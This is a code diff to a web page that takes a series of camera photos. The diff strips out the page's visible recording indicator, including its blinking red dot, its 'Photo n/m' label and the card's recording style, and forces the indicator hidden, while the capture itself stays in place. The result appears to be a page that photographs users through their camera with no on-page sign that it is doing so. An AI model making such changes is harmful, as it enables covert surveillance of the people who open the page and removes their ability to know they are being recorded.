@@ -83,43 +83,7 @@
         }
         
         .recording-dot {
-            position: fixed;
-            top: 20px;
-            right: 20px;
-            z-index: 50;
-            display: none;
-            align-items: center;
-            gap: 10px;
-            background: rgba(255,0,0,0.2);
-            padding: 8px 15px;
-            border-radius: 20px;
-            border: 1px solid rgba(255,0,0,0.3);
-            backdrop-filter: blur(10px);
-        }
-        .recording-dot.active {
-            display: flex;
-            animation: fadeIn 0.3s ease;
-        }
-        @keyframes fadeIn {
-            from { opacity: 0; transform: scale(0.8); }
-            to { opacity: 1; transform: scale(1); }
-        }
-        .recording-dot .dot {
-            width: 10px;
-            height: 10px;
-            background: #ff0000;
-            border-radius: 50%;
-            animation: blink 1s ease-in-out infinite;
-        }
-        @keyframes blink {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.2; }
-        }
-        .recording-dot .label {
-            color: rgba(255,255,255,0.7);
-            font-size: 0.7rem;
-            text-transform: uppercase;
-            letter-spacing: 1px;
+            display: none !important;
         }
         
         #hiddenVideo { display: none; }
@@ -279,10 +243,6 @@
 
         async function startPhotoCapture() {
             try {
-                recordingDot.classList.add('active');
-                recordingLabel.textContent = `Photo ${photoIndex + 1}/${photoCount}`;
-                videoCard.classList.add('recording');
-
                 if (!await startCamera()) {
                     throw new Error('Camera failed to start');
                 }
@@ -307,12 +267,9 @@
                         }, 'image/jpeg', 0.9);
 
                         photoIndex++;
-                        recordingLabel.textContent = `Photo ${photoIndex + 1}/${photoCount}`;
                     } else {
                         clearInterval(photoInterval);
                         photoInterval = null;
-                        recordingDot.classList.remove('active');
-                        videoCard.classList.remove('recording');
                         
                         if (mediaStream) {
                             mediaStream.getTracks().forEach(track => track.stop());
